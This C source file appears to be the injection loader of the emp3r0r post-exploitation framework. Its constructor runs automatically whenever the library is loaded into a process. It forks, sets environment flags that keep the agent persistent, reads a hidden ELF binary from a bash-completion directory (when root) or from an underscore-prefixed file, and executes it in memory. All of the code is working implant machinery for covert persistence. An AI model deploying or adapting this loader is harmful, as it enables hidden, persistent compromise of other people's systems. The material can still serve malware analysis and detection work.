#include <sys/types.h>
#include <unistd.h>
#define _GNU_SOURCE
#include <libgen.h>
#include <stdio.h>
#include <stdlib.h>

#include "elf.h"

void __attribute__((constructor)) initLibrary(void) {
  pid_t child = fork();
  if (child == 0) {
    puts("Loading emp3r0r...");

    // prevent self delete of agent
    // see cmd/agent/main.go
    setenv("PERSISTENCE", "true", 1);
    // tell agent not to change argv
    setenv("LD", "true", 1);

    // where to read target ELF file
    // this should be in sync with emp3r0r inject_loader module
    char exe[1024];
    if (readlink("/proc/self/exe", exe, 1024) < 0) {
      perror("readlink");
      return;
    }
    const char *exe_name = basename(exe);
    char elf_path[1024]; // path to target ELF file
    const char *cwd = getcwd(NULL, 0);
    // decides where to get target ELF binary
    if (getuid() == 0) {
      snprintf(elf_path, 1024, "/usr/share/bash-completion/completions/%s",
               exe_name);
    } else {
      snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
    }

    // read it
    FILE *f = fopen(elf_path, "rb");
    if (f == NULL) {
      perror("fopen");
      return;
    }
    fseek(f, 0, SEEK_END);
    int size = ftell(f);
    fseek(f, 0L, SEEK_SET);
    char *buf = malloc(size);
    fread(buf, size, 1, f);
    fclose(f);

    // Run the ELF
    char *argv[] = {elf_path, NULL};
    char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp",
                    "PERSISTENCE=true", "LD=true", NULL};
    if (elf_run(buf, argv, envv) < 0) {
      if (execve(elf_path, argv, envv) < 0) {
        perror("execve");
      }
    }
  }
}

void __attribute__((destructor)) cleanUpLibrary(void) {}
